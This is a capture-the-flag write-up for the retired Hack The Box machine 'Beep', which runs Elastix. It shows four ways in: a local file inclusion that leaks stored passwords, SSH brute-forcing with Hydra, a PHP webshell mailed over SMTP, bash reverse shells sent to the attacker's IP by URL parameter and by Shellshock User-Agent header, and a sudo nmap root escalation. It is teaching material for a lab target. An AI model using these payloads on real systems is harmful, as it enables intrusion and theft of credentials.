# Beep

This is the write-up for the box Beep that got retired at the 1st September 2017.
My IP address was 10.10.14.13 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.7    beep.htb
```

This box has many ways to get the flags and I will explain some of them and not only clear this box in one way.

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/beep.nmap 10.10.10.7
```

```markdown
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL LOGIN-DELAY(0) RESP-CODES EXPIRE(NEVER) PIPELINING APOP IMPLEMENTATION(Cyrus POP3 server v2) STLS AUTH-RESP-CODE USER TOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed IMAP4rev1 IMAP4 URLAUTHA0001 CATENATE BINARY NAMESPACE QUOTA CHILDREN LIST-SUBSCRIBED IDLE ANNOTATEMORE MAILBOX-REFERRALS NO X-NETSCAPE CONDSTORE SORT UNSELECT ID OK STARTTLS THREAD=REFERENCES ATOMIC ACL SORT=MODSEQ RIGHTS=kxte LISTEXT MULTIAPPEND RENAME LITERAL+ THREAD=ORDEREDSUBJECT UIDPLUS
443/tcp   open  ssl/https?
|_ssl-date: 2019-11-03T16:48:03+00:00; +1h00m01s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```

## Method 1

### Checking HTTP / HTTPS (Port 80 and 443)

Browsing to the web page on HTTP we get automatically forwarded to the HTTPS page where we find an **Elastix** login prompt.
Elastix is a PBX appliance which is a unified communications server software and has different collaboration services.

Lets look for hidden paths with **Gobuster**:
```markdown
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
```

The most interesting results are:
- /help (Status: 301)
  - Default documentation of the Elastix appliance
- /mail (Status: 301)
  - Roundcube server
- /admin (Status: 301)
  - Login prompt for FreePBX server version 2.8.1.4
- /recordings (Status: 301)
  - Login prompt for FreePBX server version 2.8.1.4
- /vtigercrm (Status: 301)
  - vtiger CRM 5 software

Looking for vulnerabilities in the software:
```markdown
searchsploit elastix
```

We try the **Elastix 2.2.0 - 'graph.php' Local File Inclusion** to disclose the contents of files from the server. This vulnerability finds some valueable information by browsing to the path:
> **/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action**.

This outputs the FreePBX database configuration file that includes usernames and passwords:
```markdown
AMPDBHOST=localhost
AMPDBENGINE=mysql
#AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
#AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

With a _Local File Inclusion_ we can search for any file on the server like /etc/passwd to see the users on the server. The interesting users on this box are:
- root
- mysql
- cyrus
- asterisk
- spamfilter
- fanis

With these passwords and users we can create lists to see if the credentials work on SSH with **Hydra**:
```markdown
hydra -L users.txt -P passwords.txt ssh://10.10.10.7
```

The server will eventually block us but we can try the passwords manually, too. When done we will see that the _root_ user has the password _jEhdIekWmdjE_ which we can log in with!

## Method 2

### Checking SMTP (Port 25)

We know that there is a LFI vulnerability and now we turn this into RCE instead of looking for passwords.

We connect to the SMTP port with telnet and verify if the _asterisk@localhost_ exists and send him an email with a PHP line with which we can execute system commands:
```markdown
telnet 10.10.10.7 25

EHLO test.local

VRFY asterisk@localhost
252 2.0.0 asterisk@localhost

MAIL FROM:tester@pwn.local
250 2.1.0 Ok

RCPT TO: asterisk@localhost
250 2.1.5 Ok

DATA
354 End data with <CR><LF>.<CR><LF>
Subject: I got you    
<?php echo system($_REQUEST['test']); ?>

.
250 2.0.0 Ok: queued as 1612CD92FD
```

When we use the LFI from before we can browse to the path mails are and input the parameter _test_ with the value `whoami` to see if the code execution works.
```markdown
hxxps://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&test=whoami
```

It outputs the correct output of `whoami`, so code execution works and we can start a reverse shell now.
```markdown
test=bash+-i+>%26+/dev/tcp/10.10.14.13/9001+0>%261
```

Our listener on port 9001 starts a reverse shell on the box with the user _asterisk_.

#### Privilege Escalation

In Elastix a user can run Nmap by default with sudo rights and if we run _Nmap interactive_ we can start bash from there as root:
```markdown
sudo nmap --interactive

# In the nmap shell nmap>
!sh
```

It only shows a blank line but still accepts commands and we can verify that we are root with the `id` command.

## Method 3

### Remote Code Execution

If we look for vulnerabilities in Elastix again there is **FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution** which we will use. This script will fail because of the SSL certificate so we run this through a proxy in Burpsuite.

**Burpsuite**:
Proxy --> Options --> Add Proxy Listener
- Bind to port: 80
- Bind to address: Loopback only
- Redirect to host: 10.10.10.7
- Redirect to port: 443
- Force use of SSL

We need to change the parameters to our needs:
```markdown
rhost="localhost"
lhost="10.10.14.13"
lport=443
extension="233"
```

The valid extension can be found with the tools from **SIPVicious**:
```markdown
svmap 10.10.10.7

svwar -m INVITE -e200-250 10.10.10.7
```

Running the script will give us a shell with the user _asterisk_.

## Method 4

### Shellshock on Webmin (Port 10000)

On port 10000 it runs a webmin appliance that is vulnerable to **Shellshock**.
By intruding the request with Burpsuite and changing the _User-Agent_ to the Shellshock string we can exploit this box.
```markdown
GET / HTTP/1.1
Host: 10.10.10.7:10000
**User-Agent: () { :; }; sleep 10**
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
(...)
```

With the `sleep 10` command we verify that code execution is possible by waiting 10 seconds for the server to respond.
Now we can put a reverse shell in there:
```markdown
User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.13/9001 0>&1
```

Our listener starts a reverse shell with the user root!
